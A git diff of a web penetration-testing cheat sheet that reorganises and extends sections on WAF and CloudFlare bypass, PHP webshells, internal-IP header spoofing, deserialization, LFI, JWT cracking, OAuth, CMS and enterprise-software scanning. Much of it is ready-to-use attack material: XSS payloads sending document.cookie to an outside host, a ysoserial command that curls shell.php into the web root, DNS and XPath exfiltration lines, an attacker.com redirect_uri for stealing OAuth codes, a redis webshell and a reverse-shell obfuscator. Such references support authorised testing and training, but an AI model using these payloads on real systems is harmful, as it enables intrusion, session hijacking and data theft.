@@ -17,10 +17,24 @@ https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva
 https://www.iphistory.ch/en/  
 
 -> DNS History  
+```
+bash bypass-firewalls-by-DNS-history.sh -d site.com
+```
 https://github.com/vincentcox/bypass-firewalls-by-DNS-history
 
--> Bypass to find real IP in CloudFlare  
+-> Bypass to find real IP in CloudFlare - CrimeFlare  
+```
+./crimeflare.php exemple.com
+```
 https://github.com/zidansec/CloudPeler  
+-> CloudFlair is a tool to find origin servers of websites protected by CloudFlare who are publicly exposed and don't restrict network access to the CloudFlare IP ranges as they should.  
+```
+python cloudflair.py myvulnerable.site
+```
+
+https://github.com/christophetd/CloudFlair
+-> Discover CloudFlare WordPress IP  
+https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/
 
 ### Bypass using cipher not supported by WAF
 ```
@@ -50,7 +64,6 @@ e.g. (127.0.0.1)
 https://www.silisoftware.com/tools/ipconverter.php
 
 ## PHP Obfuscation Techniques:
-
 ### Mix - Hex + Octal
 `echo "T\x72\x69\143\153s";#Tricks`
 
@@ -65,8 +78,9 @@ https://www.silisoftware.com/tools/ipconverter.php
 `echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET`  
 https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/
 
-### PHP Bypass - disable_functions
-#### Functions
+## PHP Bypass - disable_functions
+### Functions
+
 -> shell_exec  
 ```
 <?php echo shell_exec($_GET['ok']);?>
@@ -104,17 +118,28 @@ https://3v4l.org/
 https://malwaredecoder.com/  
 https://hackvertor.co.uk/public  
 
-### Spoofing Internal IP in Request Header
+## Spoofing Internal IP in Request Header
 
 ```
 X-Originating-IP: 127.0.0.1
 X-Forwarded-For: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded-For-Ip: 127.0.0.1
 X-Forwarded-Host: 127.0.0.1
 X-Remote-IP: 127.0.0.1
 X-Remote-Addr: 127.0.0.1
 X-Client-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
 ```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/headers_internal_bypass.txt
+
+## 403 Bypass 
+```
+./dontgo403 -u http://site.com/admin
+```
+https://github.com/devploit/dontgo403
 
 ## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)
 ### XSS Protection
@@ -248,7 +273,6 @@ https://malwaredecoder.com/
 
 ### XSS - Session Hijacking
 -> Examples
-  
 ```
 <script type="text/javascript">document.location="http://ip/?cookie="+document.cookie;</script>  
 <script>window.location="http://ip/?cookie="+document.cookie;</script>
@@ -256,8 +280,30 @@ https://malwaredecoder.com/
 <script>fetch('http://ip/?cookie=' + btoa(document.cookie));</script>
 ```
 
+### Tools
+-> dalfox  
+```
+dalfox url http://example.com
+```
+https://github.com/hahwul/dalfox
+
+-> gxss  
+```
+echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
+```
+https://github.com/KathanP19/Gxss
+
 ### Template - Nuclei
 https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
+
+## Git Exposed
+```
+git-dumper http://site.com/.git .
+```
+https://github.com/arthaud/git-dumper
+
+### Tools
+https://github.com/internetwache/GitTools
 
 ## Type Juggling and Hash Collision
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf  
@@ -304,7 +350,7 @@ https://github.com/ambionics/phpggc
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/token_hmac_sha1.php
 
 ### .NET Deserialization
-#### Methods Serialization:
+#### Methods Serialization
 
 -> Binary Formatter  
 -> DataContractSerializer  
@@ -312,12 +358,10 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 -> XML Serialization  
   
 #### Most common places to find serialized data
-
 -> VIEWSTATE  
 -> .NET remoting services  
 
 #### Identify
-
 -> Detect via Response Simple in SOAP Message
 ```
 POST /endpoint HTTP/1.1
@@ -339,10 +383,21 @@ Contet-Type: text/xml
 ```
 `tcpdump -i tap0 icmp`
 
+#### Exploitation
+-> Insecure - Machine Key for RCE  
+https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md  
+
+#### Tools
+https://github.com/0xacb/viewgen  
+https://github.com/pwntester/ysoserial.net  
+https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper
+https://github.com/tyranid/ExploitRemotingService
+
+### Other Docs
+https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net#PoC  
+
 ### Java Deserialization
-
 #### Identify
-
 -> import java.io.serializable  
 -> binary with ac ed 00 05  
 -> base64 starts with rO0AB in web applications
@@ -374,7 +429,6 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/payloads.txt
 
 #### Signals
-  
 -> Bad Sign  
 ClassNot FoundException
 
@@ -382,10 +436,11 @@ ClassNot FoundException
 java.io.IOException
   
 #### JRMPListener and JRMPClient (CommonsCollections)
-  
-`java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections “curl http://ip:port/shell.php -o /var/www/shell.php”`  
-`java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0`
-  
+```
+java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections "curl http://ip:port/shell.php -o /var/www/shell.php"
+java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0
+```
+
 ### Python Deserialization
 
 #### Pickle
@@ -406,14 +461,21 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 ### YAML Deserialization
   
-`!!python/object/apply:os.system ["sleep 5"]`  
+```
+!!python/object/apply:os.system ["sleep 5"]
+```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/yaml/exploit.yaml
-  
+
+### nodejs Deserialization
+
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+
 ## XPATH Injection
-  
-`error()`  
-`* and doc('http://hacker.site/')`  
-`* and doc('http://hacker.site/', name(/*) ))`  
+```
+error()
+* and doc('http://hacker.site/')
+* and doc('http://hacker.site/', name(/*) ))
+```
   
 ### Tool
 https://xcat.readthedocs.io/en/latest/
@@ -422,7 +484,7 @@ https://xcat.readthedocs.io/en/latest/
 https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt  
 https://pastebin.com/raw/rKpsMp0g  
 
-## LDAP query and LDAP Injection
+## LDAP Exploitation
 ### LDAP Injection - Bypass Login
 
 ```$filter = "(&(uid=$username)(userPassword=$password))";```  
@@ -446,93 +508,6 @@ https://github.com/dinigalab/ldapsearch
 ### Docs
 https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html  
 https://book.hacktricks.xyz/pentesting-web/ldap-injection
-
-## Attacking OAuth
- 
-### Workflow OAuth Authorization Code Grant Type
-1- 
-  
-```
-GET /authorization?client_id=<client_id>&redirect_uri=https://site.com/callback&response_type=code&scope=openid%20profile%20email HTTP/1.1  
-Host: site.com
-```
-2-
-  
-```
-GET /callback?code=<code> HTTP/1.1
-Host: site.com
-```
-Vulnerability Forced OAuth profile linking
-  
--> CSRF
-```
-<html>
-	<body>
-      		<form action="http://site.com/callback?code=<code>" method="GET">
-		</form> 
-	</body>
-	<script>
-		document.forms[0].submit();
-	</script>
-</html>
-```  
-
-Vulnerability Code Stealing
-
--> Open Redirect (redirect_uri)
-```
-https://site.com/authorization?client_id=%3Cclient_id%3E&redirect_uri=http://attacker.com/callback&response_type=code&scope=openid%20profile%20email
-```
-3-
-```
-POST /token HTTP/1.1
-Host: oauth.server.com
-
-client_id=<client_id>&client_secret=<client_secret>&redirect_uri=https://site.com/callback&grant_type=authorization_code&code=<code>
-```
-Vulnerability Brute-Force the Client Secret
-
-```
-POST /token 
-Host: site.com
-Content-Type: application/x-www-form-urlencoded  
-
-client_id=<client_id>&client_secret=<BRUTE_FORCE>&redirect_uri=http%3A%2F%2Fip%2Fcallback&grant_type=authorization_code&code=<code>
-```  
-4-
-```  
-{
-    "access_token": "<access_token>",
-    "token_type": "Bearer",
-    "expires_in": 3600,
-    "scope": "openid profile"
-}
-```
-
-5-
-```  
-GET /userinfo HTTP/1.1  
-Host: oauth.server.com  
-Authorization: Bearer <token>
-```
-
-6- 
-```
-{
-    "username":"user",
-    "email":"user@ok.com"
-}
-```
-
-## Padding Oracle Attack
-  
-e.g.  
--> rememberMe: (Cookie)  
--> Exploiting  
-`java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class`  
-https://github.com/frohoff/ysoserial  
-`python shiro_exp.py site.com/home.jsp cookie payload.class`  
-https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py  
   
 ## Hash Length Extension Attack
 
@@ -546,14 +521,6 @@ https://github.com/iagox86/hash_extender
 
 2-  
 burp intruder -> payloads.out in file parameter.  
-
-## Insecure - Machine Key for RCE 
-https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md  
-https://github.com/pwntester/ysoserial.net  
-https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper  
-  
-### Other Docs
-https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
 
 ## Local File Inclusion - LFI
 ### Replace ../ - Bypass
@@ -638,6 +605,10 @@ http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
 /proc/self/fd/0-50  
 ```
 
+### Template LFI and directory traversal - Nuclei
+https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml
+https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml
+
 ### Wordlists
 -> burp-parameter-names.txt - Wordlist for parameter fuzzing
 https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt  
@@ -650,9 +621,11 @@ https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/word
 -> poisoning.txt  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  
 
-### Template LFI and directory traversal - Nuclei
-https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml
-https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml
+### Tool
+```
+python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a
+```
+https://github.com/hansmach1ne/lfimap  
 
 ## Path Normalization
 https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
@@ -745,9 +718,6 @@ username=admin&password[$regex]=^.{6}$
 username=admin&password[$regex]=^a.....  
 ```
 
-## Graphql Introspection
-https://ivangoncharov.github.io/graphql-voyager/
-
 ## Webshell via redis
 `redis-cli -h ip`  
 `config set dir /var/www/html`  
@@ -800,7 +770,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
   
 -> csrf_json_xhr.html  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_json_xhr.html
-  
+
 ### Bypass Token CSRF - Example
 -> csrf_token_bypass.html  
 ```<script type="text/javascript">
@@ -849,8 +819,29 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 2-  
 `cat tokens.txt | uniq -c | nl`  
 
-## SSTI
+## ClickJacking
+```
+<iframe src="https://example.com">
+```
+-> Scan your site now - check for headers  
+https://securityheaders.com/
 
+## Host Header Injection
+```
+headi -url http://site.com/admin.php
+```
+https://github.com/mlcsec/headi
+
+## Request Smuggling
+```
+python3 smuggler.py -u <URL>
+```
+https://github.com/defparam/smuggler
+
+-> Study  
+https://portswigger.net/web-security/request-smuggling  
+
+## SSTI
 ### Identify
 
 -> Jinja2 or Twig
@@ -990,8 +981,10 @@ E.g.
 https://github.com/siberas/sjet  
 http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar  
 
-## Null Origin Exploitation
+-> bARMIe  
+https://github.com/NickstaDB/BaRMIe
 
+## Null Origin Exploitation
 -> Identify - Response
 ```
 HTTP/1.1 200 OK  
@@ -1069,6 +1062,12 @@ e.g.
 %0d%0aX-Content-Security-Policy: allow *%0d%0a%0d%0a
 %0d%0aX-Content-Security-Policy: allow *
 ```
+
+### Tools
+```
+crlfuzz -u "http://example.com"
+```
+https://github.com/dwisiswant0/crlfuzz
 
 ### Template - Nuclei
 https://raw.githubusercontent.com/pikpikcu/nuclei-templates/master/vulnerabilities/crlf-injection.yaml
@@ -1193,15 +1192,175 @@ https://nodejs.org/api/process.html
 
 ## Remote Code Execution
 
-### Wordlists
-https://github.com/payloadbox/command-injection-payload-list
-
 ### RCE - Exfiltrating via DNS
 ```
 curl http://$(whoami).site.com/
 curl http://`whoami`.site.com/
 ```
 
+### Wordlists
+https://github.com/payloadbox/command-injection-payload-list
+
+## API Exploitation
+-> API Security Guide  
+https://github.com/0xCGonzalo/Golden-Guide-for-Pentesting/tree/master/API%20Security
+
+-> API Security Checklist  
+https://github.com/shieldfy/API-Security-Checklist
+
+-> API Security Tips  
+https://github.com/inonshk/31-days-of-API-Security-Tips
+
+-> MindAPI  
+https://dsopas.github.io/MindAPI/play/  
+
+-> Simple website to guess API Key
+https://api-guesser.netlify.app/
+
+-> HackTricks  
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting
+
+-> Others
+https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#newsletter
+
+### Rest API
+
+### SOAP
+
+### Graphql
+-> Introspection  
+https://ivangoncharov.github.io/graphql-voyager/  
+-> No-Introspection - Clairvoyance allows us to get GraphQL API schema when introspection is disabled  
+https://github.com/nikitastupin/clairvoyance  
+-> graphw00f - GraphQL Server Fingerprinting  
+```
+python3 main.py -f -t https://demo.hypergraphql.org:8484/graphql
+```
+https://github.com/dolevf/graphw00f  
+-> GraphQL Security - Quickly assess the security of your GraphQL apps  
+https://graphql.security/
+
+## JSON Web Tokens - JWT Attacks
+### JWT Decoder
+https://jwt.io/  
+-> jwt-decoder.py  
+```
+python3 jwt-decoder.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4"
+```
+https://github.com/mazen160/jwt-pwn  
+
+### JWT Cracking - Brute-Force
+-> go-jwt-cracker  
+```
+./go-jwt-cracker -wordlist /pentest/wordlist.txt -token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4"
+```
+https://github.com/mazen160/jwt-pwn
+
+-> Hashcat  
+```
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+hashcat jwt.txt -m 16500 -a 3 -w 2 ?d?d?d?d
+```
+-> John  
+```
+john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
+```
+
+### JWT None Attack
+
+### Other Tools
+-> jwt_tool.py   
+```
+python3 jwt_tool.py <JWT>
+```
+https://github.com/ticarpi/jwt_tool
+
+## Attacking OAuth
+ 
+### Workflow OAuth Authorization Code Grant Type
+1- 
+  
+```
+GET /authorization?client_id=<client_id>&redirect_uri=https://site.com/callback&response_type=code&scope=openid%20profile%20email HTTP/1.1  
+Host: site.com
+```
+2-
+  
+```
+GET /callback?code=<code> HTTP/1.1
+Host: site.com
+```
+Vulnerability Forced OAuth profile linking
+  
+-> CSRF
+```
+<html>
+	<body>
+      		<form action="http://site.com/callback?code=<code>" method="GET">
+		</form> 
+	</body>
+	<script>
+		document.forms[0].submit();
+	</script>
+</html>
+```  
+
+Vulnerability Code Stealing
+
+-> Open Redirect (redirect_uri)
+```
+https://site.com/authorization?client_id=%3Cclient_id%3E&redirect_uri=http://attacker.com/callback&response_type=code&scope=openid%20profile%20email
+```
+3-
+```
+POST /token HTTP/1.1
+Host: oauth.server.com
+
+client_id=<client_id>&client_secret=<client_secret>&redirect_uri=https://site.com/callback&grant_type=authorization_code&code=<code>
+```
+Vulnerability Brute-Force the Client Secret
+
+```
+POST /token 
+Host: site.com
+Content-Type: application/x-www-form-urlencoded  
+
+client_id=<client_id>&client_secret=<BRUTE_FORCE>&redirect_uri=http%3A%2F%2Fip%2Fcallback&grant_type=authorization_code&code=<code>
+```  
+4-
+```  
+{
+    "access_token": "<access_token>",
+    "token_type": "Bearer",
+    "expires_in": 3600,
+    "scope": "openid profile"
+}
+```
+
+5-
+```  
+GET /userinfo HTTP/1.1  
+Host: oauth.server.com  
+Authorization: Bearer <token>
+```
+
+6- 
+```
+{
+    "username":"user",
+    "email":"user@ok.com"
+}
+```
+
+## Padding Oracle Attack
+  
+e.g.  
+-> rememberMe: (Cookie)  
+-> Exploiting  
+`java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class`  
+https://github.com/frohoff/ysoserial  
+`python shiro_exp.py site.com/home.jsp cookie payload.class`  
+https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py  
 ### Reverse Shell Obfuscator
 e.g.  
 `python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
@@ -1242,37 +1401,105 @@ https://github.com/rodolfomarianocy/hackshell
 ### ImageTragik
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg
 
+## Third-party Software, ITSM, ITSO, ITBM
+### Jira
+-> Check privileges in:  
+```
+/rest/api/2/mypermissions
+/rest/api/3/mypermissions
+```
+-> jira-scan  
+```
+jira-scan -u https://site.com/
+```
+https://github.com/bcoles/jira_scan
+
+-> Jiraffe
+```
+jiraffe -t https://site.com
+```
+https://github.com/0x48piraj/Jiraffe
+
+### SalesForce
+-> sret  
+```
+python3 main.py <URL>
+```
+https://github.com/reconstation/sret
+
+### SAP - ERP
+#### Tools
+https://github.com/chipik/SAP_RECON
+
+#### Wordlists
+https://raw.githubusercontent.com/emadshanab/SAP-wordlist/main/SAP-wordlist.txt
+
+#### Others
+https://github.com/shipcod3/mySapAdventures
+
+ServiceNow
+-> Brute-Force in KB00<here>  
+```
+https://company.service-now.com/kb_view_customer.do?sysparm_article=KB00xxxxx
+```
+https://medium.com/@th3g3nt3l/multiple-information-exposed-due-to-misconfigured-service-now-itsm-instances-de7a303ebd56
+
+### Sharepoint
+https://github.com/H0j3n/EzpzSharepoint
+
 ## CMS
 ### Wordpress
 -> wpscan  
-`wpscan --url http://site.com/wordpress --api-token <your_token> --enumarate vp --plugins-detection aggressive`  
+```
+wpscan --url http://site.com/wordpress --api-token <your_token> --enumarate vp --plugins-detection aggressive
+```  
 https://wpscan.com/wordpress-security-scanner
 
 ### Joomla
 -> juumla  
-`python main.py -u <target>`  
+```
+python main.py -u <target>
+```  
 https://github.com/oppsec/juumla  
 
 ### Drupal
 -> droopescan  
-`droopescan scan drupal -u <target> -t 32`  
+```
+droopescan scan drupal -u <target> -t 32
+```
 https://github.com/SamJoan/droopescan  
+
+-> Reverse Shell  
+https://www.hackingarticles.in/drupal-reverseshell/
+
+### Magento
+https://github.com/steverobbins/magescan 
 
 ## Fuzzing (+) 
 ### Fuzzing Subdomain - DNS
-`ffuf -u "https://FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
+```
+ffuf -u "https://FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+```
 
 ### Fuzzing Subdomain - VHOST
-`ffuf  -u "https://site.com" -H 'Host: FUZZ.site.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt -fs xxx`
+```
+ffuf  -u "https://site.com" -H 'Host: FUZZ.site.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt -fs xxx
+```
 
 ### Fuzzing File Extension
-`ffuf -u "https://site.com/indexFUZZ" -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -fs xxx`
+```
+ffuf -u "https://site.com/indexFUZZ" -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -fs xxx
+```
 
 ### Fuzzing Parameter GET
-`ffuf -u "https://site.com/index.php?FUZZ=ok" -w wordlist.txt -fs xxx`
+```
+ffuf -u "https://site.com/index.php?FUZZ=ok" -w wordlist.txt -fs xxx
+```
   
 ### Fuzzing Parameter POST
-`ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx`  
+```
+ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx
+```  
 https://github.com/danielmiessler/SecLists
 
 ## Cloud (+)
@@ -1442,8 +1669,15 @@ https://github.com/digininja/CeWL
 
 #### Webhook online
 https://webhook.site/#!/b3d5ed21-b58d-4a77-b19d-b7cdc2eeadc0
+
+#### builtwith - Find out what websites are Built with
+https://builtwith.com/
+
 #### Reverse Shell
 https://www.revshells.com/
  
 #### Api Security
 https://platform.42crunch.com/
+
+#### Source Code Search Engine
+https://publicwww.com/
